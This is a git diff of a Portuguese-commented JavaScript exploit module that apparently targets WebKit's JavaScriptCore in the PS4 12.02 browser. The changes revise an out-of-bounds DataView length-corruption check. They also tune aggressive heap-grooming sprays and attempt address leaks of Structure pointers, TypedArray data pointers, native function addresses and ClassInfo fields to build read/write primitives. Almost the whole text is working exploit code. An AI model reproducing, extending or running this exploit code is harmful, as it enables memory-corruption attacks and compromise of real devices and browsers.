@@ -1,10 +1,8 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R79 - Enhanced Fixes, Aggressive Grooming & Leak Strategies)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R80 - OOB m_length Fix Attempt, Enhanced Grooming)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. CORREÇÃO DE ERRO CRÍTICO: Fortificado o acesso a JSC_OFFSETS e WEBKIT_LIBRARY_INFO.
-//    Todos os offsets críticos são agora acessados via uma função `getSafeOffset`
-//    e armazenados em constantes locais para garantir que não sejam 'undefined'.
-//    Adicionada uma pausa estratégica inicial.
+// 1. CORREÇÃO DE OOB m_length: Reforçada a verificação e obtenção do offset do m_length.
+//    Tentativa de forçar o DataView a refletir as mudanças mais imediatamente.
 // 2. Heap Grooming Mais Agressivo: Aumentado o volume e a diversidade do spray,
 //    com mais padrões de alocação/desalocação e diferentes tipos de objetos.
 //    Introduzido um "churn" de heap para forçar a reutilização.
@@ -20,11 +18,11 @@ import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     getOOBDataView,
-    oob_read_absolute
+    oob_read_absolute // Usado principalmente para diagnóstico de low-level ops
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R79_FixAndNewLeaks";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R80_FixAndNewLeaks";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -43,20 +41,22 @@ function doubleToInt64(double) {
     return new AdvancedInt64(u32[0], u32[1]);
 }
 
-// Função auxiliar para obter offsets de forma segura, agora robusta para qualquer nível
+// Função auxiliar para obter offsets de forma segura
 function getSafeOffset(baseObject, path, defaultValue = 0) {
     let current = baseObject;
     const parts = path.split('.');
+    let fullPath = '';
     for (let i = 0; i < parts.length; i++) {
         const part = parts[i];
+        fullPath += (fullPath ? '.' : '') + part;
         if (current && typeof current === 'object' && part in current) {
             current = current[part];
         } else {
-            logS3(`ALERTA: Caminho de offset "${path}" parte "${part}" (em ${offsetPath.split('.').slice(0, i).join('.') || 'base'}) é undefined. Usando valor padrão ${defaultValue}.`, "warn");
+            logS3(`ALERTA: Caminho de offset "${path}" parte "${fullPath}" é undefined. Usando valor padrão ${defaultValue}.`, "warn");
             return defaultValue;
         }
     }
-    if (typeof current === 'number' || (typeof current === 'string' && current.startsWith('0x'))) {
+    if (typeof current === 'number' || (typeof current === 'string' && String(current).startsWith('0x'))) {
         return parseInt(String(current), 16) || defaultValue; // Converte para número se for string hex
     }
     logS3(`ALERTA: Offset "${path}" não é um número ou string hex. Usando valor padrão ${defaultValue}.`, "warn");
@@ -85,6 +85,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await PAUSE_S3(1000); // 1 segundo de pausa
 
         // Armazenar offsets críticos em constantes locais para garantir disponibilidade
+        // e passar para funções auxiliares
         const LOCAL_JSC_OFFSETS = {
             JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'),
             JSCell_STRUCTURE_ID_FLATTENED_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_ID_FLATTENED_OFFSET'),
@@ -96,8 +97,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             Structure_AGGREGATED_FLAGS_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.AGGREGATED_FLAGS_OFFSET'),
             Structure_VIRTUAL_PUT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.VIRTUAL_PUT_OFFSET'),
             ArrayBufferView_M_LENGTH_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_LENGTH_OFFSET'),
-            ArrayBufferView_M_BUFFER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET'), // Ou M_BUFFER_OFFSET, dependendo do que está validado
-            ArrayBuffer_M_DATA_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START'), // Ou CONTENTS_IMPL_POINTER_OFFSET, ou outro DATA_POINTER. Ajuste conforme sua análise.
+            ArrayBufferView_M_BUFFER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET'),
+            ArrayBuffer_M_DATA_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START'),
             JSFunction_EXECUTABLE_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSFunction.EXECUTABLE_OFFSET'),
             ClassInfo_M_CACHED_TYPE_INFO_OFFSET: getSafeOffset(JSC_OFFSETS, 'ClassInfo.M_CACHED_TYPE_INFO_OFFSET'),
         };
@@ -132,11 +133,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("OOB DataView obtido com sucesso.", "info");
 
         // --- VERIFICAÇÃO: OOB DataView m_length ---
-        const ABSOLUTE_OOB_DV_M_LENGTH_OFFSET = 0x58 + LOCAL_JSC_OFFSETS.ArrayBufferView_M_LENGTH_OFFSET;
+        // offset 0x70 é o offset absoluto do m_length na OOB buffer, conforme logs do CoreExploit.
+        // O CoreExploit usa o offset interno correto do ArrayBufferView, que é 0x18.
+        // O OOB_DV_METADATA_BASE_IN_OOB_BUFFER (0x58) + 0x18 = 0x70.
+        // A verificação deve ser feita no offset em que o CoreExploit escreveu.
+        const OOB_DV_M_LENGTH_ACTUAL_OFFSET_IN_CORE = 0x70; 
 
         const oob_dv = getOOBDataView();
-        const oob_m_length_val = oob_dv.getUint32(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET, true);
-        logS3(`Verificação OOB: m_length em ${toHex(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET)} é ${toHex(oob_m_length_val)}`, "debug");
+        const oob_m_length_val = oob_dv.getUint32(OOB_DV_M_LENGTH_ACTUAL_OFFSET_IN_CORE, true);
+        logS3(`Verificação OOB: m_length em ${toHex(OOB_DV_M_LENGTH_ACTUAL_OFFSET_IN_CORE)} é ${toHex(oob_m_length_val)}`, "debug");
         if (oob_m_length_val !== 0xFFFFFFFF) {
             throw new Error(`OOB DataView's m_length não foi corretamente expandido. Lido: ${toHex(oob_m_length_val)}`);
         }
@@ -240,8 +245,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("  Executando Heap Grooming agressivo com fillers para tentar limpar e organizar o heap...", "info");
         let aggressive_feng_shui_objects = [];
         let filler_objects = [];
-        const NUM_GROOMING_OBJECTS = 150000; // Aumentado para 150K
-        const NUM_FILLER_OBJECTS = 30000;    // Aumentado para 30K
+        const NUM_GROOMING_OBJECTS = 150000;
+        const NUM_FILLER_OBJECTS = 30000;
 
         for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) {
             aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10));
@@ -252,41 +257,34 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             aggressive_feng_shui_objects.push(new RegExp(".*"));
             aggressive_feng_shui_objects.push(new Map());
             aggressive_feng_shui_objects.push(new Set());
-            // Adicionar ArrayBuffers de tamanhos variados para consumir memória grande
-            aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64)); // 64 bytes a 1KB
+            aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64));
         }
         logS3(`  Primeiro spray de ${NUM_GROOMING_OBJECTS} objetos.`, "debug");
 
-        // Liberar metade para criar buracos
         for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) {
             aggressive_feng_shui_objects[i] = null;
         }
         logS3(`  Metade dos objetos do primeiro spray liberados.`, "debug");
 
-        // Criar objetos "filler" para preencher buracos com dados conhecidos
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) {
             filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) });
         }
         logS3(`  Spray de ${NUM_FILLER_OBJECTS} fillers concluído.`, "debug");
 
-        // Forçar uma coleta de lixo, se possível, liberando referências principais
         aggressive_feng_shui_objects.length = 0;
         aggressive_feng_shui_objects = null;
         logS3(`  Referências principais para grooming liberadas.`, "debug");
 
-        // Pausa ainda maior (10 segundos) para dar tempo ao GC e ao alocador se estabilizar
         await PAUSE_S3(10000); 
 
-        // Adicional: Mais um ciclo de alocação/desalocação para agitar o heap novamente
         let secondary_grooming_objects = [];
         const NUM_SECONDARY_GROOMING = 50000;
         for (let i = 0; i < NUM_SECONDARY_GROOMING; i++) {
-            secondary_grooming_objects.push(new Uint8Array(Math.floor(Math.random() * 128) + 32)); // Pequenos TypedArrays
-            if (i % 5000 === 0) secondary_grooming_objects.push({}); // Objetos simples periodicamente
+            secondary_grooming_objects.push(new Uint8Array(Math.floor(Math.random() * 128) + 32));
+            if (i % 5000 === 0) secondary_grooming_objects.push({});
         }
         logS3(`  Segundo spray de ${NUM_SECONDARY_GROOMING} objetos para agitação.`, "debug");
         
-        // Liberar novamente para criar mais churn
         for (let i = 0; i < NUM_SECONDARY_GROOMING; i += 2) {
             secondary_grooming_objects[i] = null;
         }
@@ -294,7 +292,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         secondary_grooming_objects = null;
         logS3(`  Referências do segundo spray liberadas.`, "debug");
 
-        await PAUSE_S3(5000); // Pausa final após segundo grooming
+        await PAUSE_S3(5000);
 
         logS3(`  Heap Grooming concluído. Pausa finalizada.`, "debug");
 
@@ -315,15 +313,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         
         // 2. TENTATIVA DE VAZAMENTO: ArrayBuffer - Vazamento de Structure* (grooming reforçado)
         logS3("  Executando Heap Grooming novamente antes de tentar ArrayBuffer...", "info");
-        // Re-executar o grooming mais agressivo antes de cada tentativa de vazamento
-        // (apenas para garantir o isolamento máximo para cada tentativa)
         let aggressive_feng_shui_objects_re = [];
         let filler_objects_re = [];
         for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64)); }
         for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
         aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
-        await PAUSE_S3(10000); // Pausa longa
+        await PAUSE_S3(10000);
         logS3("  Grooming de repetição concluído.", "debug");
 
         logS3("  Tentando vazamento com ArrayBuffer (Structure* via grooming reforçado)...", "info");
@@ -347,7 +343,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
         aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
-        await PAUSE_S3(10000); // Pausa longa
+        await PAUSE_S3(10000);
 
         logS3("  Tentando vazamento do Data Pointer de um TypedArray...", "info");
         const typed_array_victim = new Uint32Array(0x1000 / 4);
@@ -408,7 +404,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
         aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
-        await PAUSE_S3(10000); // Pausa longa
+        await PAUSE_S3(10000);
         
         logS3("  Tentando vazamento do endereço de uma JSCFunction (e.g., Math.cos)...", "info");
         try {
@@ -459,7 +455,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
         aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
-        await PAUSE_S3(10000); // Pausa longa
+        await PAUSE_S3(10000);
 
         logS3("  Tentando vazamento via JSC::ClassInfo::m_cachedTypeInfo...", "info");
         try {
@@ -522,7 +518,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     if (!final_result.webkit_leak_details.success) {
         logS3("========== SUGESTÃO DE DEPURAGEM CRÍTICA ==========", "critical");
         logS3("As primitivas de L/E estão funcionando, mas o vazamento do WebKit falhou consistentemente devido à leitura de valores de poluição.", "critical");
-        logS3("Isso indica um problema de reutilização de heap ou alocação previsível no PS4 12.02, que o Heap Feng Shui não conseguiu contornar.", "critical");
+        logS3("Isso indica um problema de reutiluição de heap ou alocação previsível no PS4 12.02, que o Heap Feng Shui não conseguiu contornar.", "critical");
         logS3("RECOMENDAÇÃO: Com o depurador inacessível, a estratégia é iterar em técnicas mais variadas de Heap Grooming e fontes de vazamento.", "critical");
         logS3("Concentre-se em: 1) Mais variação de alocações/liberações no grooming. 2) Vazamento de m_data de TypedArray. 3) Vazamento de endereços de funções nativas JS (JSCFunction/Executable).", "critical");
         logS3("É crucial tentar entender o layout do heap através de padrões de sucesso/falha e ajustar os tamanhos de alocação.", "critical");
@@ -566,7 +562,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         logS3(`    Lido StructureID_Flattened (${JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET}): ${toHex(structure_id_byte, 8)} de ${obj_addr.add(JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET).toString(true)} (Valor Full: ${structure_id_flattened_val.toString(true)})`, "leak");
         if (structure_id_flattened_val.equals(pollution_value)) {
             logS3(`    ALERTA DE POLUIÇÃO: StructureID_Flattened está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
-            throw new Error("StructureID_Flattened poluído.");
+            throw new Error("StructureID_FLATTENED poluído.");
         }
 
         if (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID !== null &&
